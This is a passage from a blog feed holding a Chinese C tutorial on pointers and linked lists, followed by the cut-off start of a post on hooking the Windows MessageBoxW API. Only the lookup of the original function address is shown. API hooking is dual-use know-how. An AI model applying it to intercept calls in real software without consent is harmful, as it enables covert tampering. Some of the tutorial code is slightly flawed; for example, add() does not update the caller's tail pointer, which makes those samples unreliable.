class="comment">//不进行初始化的指针称作“野指针”，调用野指针上的值会出大问题，注意和前文空指针的区别</span></span><br><span class="line">p = &amp;amp;a;             <span class="comment">//将p指向a的地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p); <span class="comment">//输出p中的地址上的变量的值，即a的值100</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, p);  <span class="comment">//输出p中的地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, array);<span class="comment">//输出array[0]的地址</span></span><br><span class="line">a = a + *p;         <span class="comment">//将a加上p中的地址上的变量的值，即a = a + a;</span></span><br></pre></td></tr></table></figure><p><font color="#dd0000">*代表取某地址上的值，&amp;代表取某变量的地址。</font><br>通过上述代码我们可以发现<del>指针没什么卵用甚至很麻烦</del>，让我们看一看它在函数中的用途：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);    <span class="comment">//输出100</span></span><br><span class="line">    <span class="built_in">func</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);    <span class="comment">//输出100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> *p)</span>        <span class="comment">//将p指向传入的地址</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (*p)++;              <span class="comment">//注意*和++的运算优先级</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);    <span class="comment">//输出100</span></span><br><span class="line">    <span class="built_in">func</span>(&amp;amp;a);            <span class="comment">//传入a的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);    <span class="comment">//输出101</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常来讲，如果不定义全局变量，一个函数是<font color="#dd0000">无法</font>修改其他函数中的变量的。但是上面两段代码告诉了我们，如果使用指针我们便可以实现<font color="#dd0000">跨函数修改变量</font>。<br>总的来说，如果*p是一个指针变量，那么<font color="#dd0000">p代表地址，*p代表该地址上的值</font>。</p><h3 id="再进一步"><a href="#再进一步" class="headerlink" title="再进一步"></a>再进一步</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">0x1234</span>;               <span class="comment">//0x代表16进制</span></span><br><span class="line"><span class="type">int</span> *p1 = &amp;amp;a;</span><br><span class="line"><span class="type">char</span> *p2 = (<span class="type">char</span> *)&amp;amp;a;        <span class="comment">//将&amp;amp;a从int*转换成char*</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x&quot;</span>, *p1, *p2);    <span class="comment">//输出1234 34，其中%x代表16进制int数</span></span><br></pre></td></tr></table></figure><p>对于上述代码我们发现同样是指针，仅仅是转换了指向对象的类型就会使得输出造成巨大的差别。这是为什么呢？<br>这是因为int类型的变量在内存中占据32位(称为32 bit或者4 byte)的空间，即转成二进制之后长度不能超过32，而char类型的变量只占据8位。因此，当我们将&amp;a从int*转成char*后，只会保留后8位。再加上神奇的16进制数每一个数字占4位的特性，恰好就是后两位16进制数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line"><span class="keyword">for</span>(p = a; p &lt; a + <span class="number">5</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *p);          <span class="comment">//输出5 4 3 2 1 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上述代码，我们发现数组的名字就是数组首元素的地址；(数组名字+i)就是数组第i个元素的地址。</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="链表的定义"><a href="#链表的定义" class="headerlink" title="链表的定义"></a>链表的定义</h3><p>链表顾名思义就是串成一条线的元素。这看起来跟数组很像，直接用数组不好吗？<br>事实上，链表的优势在对大量数据的增删改查。比如一个数组有1000万个元素，我要删掉中间那一个，那么就得把后500万个元素全都向前移一位。但链表仅需要单纯的删掉就可以了。</p><h3 id="链表的结构"><a href="#链表的结构" class="headerlink" title="链表的结构"></a>链表的结构</h3><p>链表上的元素我们称之为“节点”，每个节点分为数据域和指针域</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">NULL</td></tr></tbody></table><p>我们可以发现节点的指针域都指向下一个元素，尾元素指向NULL。在代码实现过程中节点编号是不存在的，此处仅为了方便展示。<br>如果我们想在上述链表尾部添加一个节点，可以分成3步：<br>第1步：构造当前节点</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th><th align="center">new</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">NULL</td><td align="center">NULL</td></tr></tbody></table><p>第2步：尾标识的指针指向当前节点</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th><th align="center">new</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">NULL</td></tr></tbody></table><p>第3步：尾标识改为当前节点</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">NULL</td></tr></tbody></table><p>如果我们想在上述链表中间添加一个节点，也可以分成3步：<br>第1步：构造当前节点</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th><th align="center">new</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">NULL</td><td align="center">NULL</td></tr></tbody></table><p>第2步：修改当前节点的指针</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th><th align="center">new</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">NULL</td><td align="center">4</td></tr></tbody></table><p>第3步：修改插入位置(3)的指针</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th><th align="center">node</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">8</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">NULL</td><td align="center">4</td></tr></tbody></table><p>整理一下可以变成更好看的模样：</p><table><thead><tr><th align="center"></th><th align="center">head</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">node</th><th align="center">tail</th></tr></thead><tbody><tr><td align="center">节点号</td><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">8</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td></tr><tr><td align="center">数据域</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td><td align="center">num</td></tr><tr><td align="center">指针域</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">8</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">NULL</td></tr></tbody></table><p>我们可以类似地进行增删改查等操作。</p><h3 id="定义语法-1"><a href="#定义语法-1" class="headerlink" title="定义语法"></a>定义语法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中data为数据域，*next为指针域。下面为先输入n再输入n个数，并构建一条链表的代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, n, temp;</span><br><span class="line">NODE *head = <span class="literal">NULL</span>, *tail = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> *node;</span><br><span class="line">    node = (NODE *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(NODE));    <span class="comment">//动态申请内存</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;amp;temp);</span><br><span class="line">    node-&gt;data = temp;                      <span class="comment">//构造当前节点</span></span><br><span class="line">    node-&gt;next = <span class="literal">NULL</span>;                      <span class="comment">//构造当前节点</span></span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span>)                        <span class="comment">//如果链表里啥都没有</span></span><br><span class="line">    &#123;</span><br><span class="line">        head = node;                        <span class="comment">//将头、尾标识都改为当前节点</span></span><br><span class="line">        tail = node;                        <span class="comment">//将头、尾标识都改为当前节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                    <span class="comment">//如果链表里有东西</span></span><br><span class="line">    &#123;</span><br><span class="line">        tail-&gt;next = node;                  <span class="comment">//尾标识的指针指向当前节点</span></span><br><span class="line">        tail = node;                        <span class="comment">//尾标识改为当前节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于上述代码，可以发现我们虽然创建了一条链表，但是它好像看不见摸不着，不像数组一样可以知道它的名字，访问具体元素等。的确，链表的访问只能通过从首节点开始遍历，但如果结合二叉树等数据结构，将会大大降低这个过程所花费的时间。<br>同时，构造链表的时候只能一个一个节点地申请内存，因为没人知道到底应当开多大。</p><h3 id="链表的增删改查"><a href="#链表的增删改查" class="headerlink" title="链表的增删改查"></a>链表的增删改查</h3><p>基础样式如下：<br><font color="#dd0000">以下代码中头节点算作第1个节点</font></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(NODE *tail, NODE *node)</span>            <span class="comment">//在链表尾部插入新节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tail-&gt;next = node;</span><br><span class="line">    tail = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(NODE *head, <span class="type">int</span> x)</span>                 <span class="comment">//删除第x个节点，不能是头节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    NODE *current = head;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; x; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next = current-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change</span><span class="params">(NODE *head, <span class="type">int</span> x, <span class="type">int</span> y)</span>       <span class="comment">//将第x个节点的data改为y</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    NODE *current = head;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; x; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;data = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(NODE *head, <span class="type">int</span> x)</span>               <span class="comment">//查找data是x的节点，返回第一个这样的节点的编号</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    NODE *current = head;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; current-&gt;next != <span class="literal">NULL</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;data == x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;data == x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于上述代码我们可以发现对于链表的遍历都是以节点进行的。</p><h2 id="小作业？"><a href="#小作业？" class="headerlink" title="小作业？"></a>小作业？</h2><p>1.读代码写结果(不要让计算机帮你读哦)：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0x123456</span>, b = <span class="number">0xabcdef</span>;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    t = *((<span class="type">char</span> *)&amp;amp;a + <span class="number">1</span>);</span><br><span class="line">    *((<span class="type">char</span> *)&amp;amp;a + <span class="number">1</span>) = *((<span class="type">char</span> *)&amp;amp;b + <span class="number">2</span>);</span><br><span class="line">    *((<span class="type">char</span> *)&amp;amp;b + <span class="number">2</span>) = t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x %x&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.读代码写结果(不要让计算机帮你读哦)：<br>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 2</span><br><span class="line">2 3</span><br><span class="line">3 4</span><br><span class="line">4 5</span><br><span class="line">5 6</span><br><span class="line">3</span><br><span class="line">1 3</span><br><span class="line">2 3</span><br><span class="line">5 6</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> month;</span><br><span class="line">    <span class="type">int</span> date;</span><br><span class="line">    NODE *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NODE *head = <span class="literal">NULL</span>, *tail = <span class="literal">NULL</span>, *current;</span><br><span class="line">    <span class="type">int</span> i, j, n, m, tm, td;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        NODE *node;</span><br><span class="line">        node = (NODE *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(NODE));</span><br><span class="line">        node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;amp;(node-&gt;month), &amp;amp;(node-&gt;date));</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            head = node;</span><br><span class="line">            tail = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            tail-&gt;next = node;</span><br><span class="line">            tail = node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;amp;m);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;amp;tm, &amp;amp;td);</span><br><span class="line">        NODE *node = head;</span><br><span class="line">        <span class="type">int</span> isFind = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">1</span>; node-&gt;next != <span class="literal">NULL</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;month == tm &amp;amp;&amp;amp; node-&gt;date == td)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, j);</span><br><span class="line">                isFind = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;month == tm &amp;amp;&amp;amp; node-&gt;date == td)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, j);</span><br><span class="line">            isFind = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isFind == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-1 &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.按要求写代码<br>构造一个函数，传入头节点head，目标编号x和新建节点node。使得新建节点插入在第x个节点后面。头节点视为第0个节点。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;指针与链表&quot;&gt;&lt;a href=&quot;#指针与链表&quot; class=&quot;headerlink&quot; title=&quot;指针与链表&quot;&gt;&lt;/a&gt;指针与链表&lt;/h1&gt;&lt;p&gt;&lt;font color=&quot;#dd0000&quot;&gt;各位CTFer可以忽略这篇文章&lt;del&gt;&lt;/font&gt;&lt;br&gt;&lt;font</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WindowsHook</title>
    <link href="https://clovershrub.github.io/2023/03/22/WindowsHook/"/>
    <id>https://clovershrub.github.io/2023/03/22/WindowsHook/</id>
    <published>2023-03-21T16:00:00.000Z</published>
    <updated>2023-09-19T02:12:47.075Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WindowsHook"><a href="#WindowsHook" class="headerlink" title="WindowsHook"></a>WindowsHook</h1><p>以MessageBox为例演示两种方法</p><h2 id="修改入口点"><a href="#修改入口点" class="headerlink" title="修改入口点"></a>修改入口点</h2><h3 id="获取原函数地址"><a href="#获取原函数地址" class="headerlink" title="获取原函数地址"></a>获取原函数地址</h3><p>需定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FARPROC pfOldMsgBoxW;  <span class="comment">//指向函数的远指针</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取原API入口地址</span></span><br><span class="line">HMODULE hModule = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;User32.dll&quot;</span>);</span><br><span class="line">pfOldMsgBoxW = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="创建新函数"><a href="#创建新函数" class="headerlink" title="创建新函数"></a>创建新函数</h3><p>注意传参与返回值应与原函数一致。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> WINAPI <span 